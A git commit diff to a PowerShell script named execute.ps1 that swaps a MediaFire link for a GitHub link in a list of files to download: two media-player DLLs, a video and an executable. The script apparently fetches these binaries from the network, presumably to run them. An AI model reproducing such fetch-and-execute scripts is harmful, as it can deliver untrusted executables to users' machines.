7a01826d86a5cc3649e510d47a5540fab5e6a022
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-10 22:58:49 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,7 +1,7 @@
 $urls = @(
     "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
     "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
-    "https://download1474.mediafire.com/xt4ghfi7irdgk96GcsyYCN3tyhVGbKBwNExEVNuiUPYN--S_zP6XZmDH3_3XBJ6zyaLv9jeDh1HCH4lDHYndIcKcDeaKrhn7fsBSC2lpna1EdA_NUIzWBhPJU5DTzmARdLFYBtC-TVViemXZK9hTip2m-XlOjvpgblQdNCpy/c1xdxv37u0dggg6/video.mp4",
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/video.mp4",
     "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
 )
 
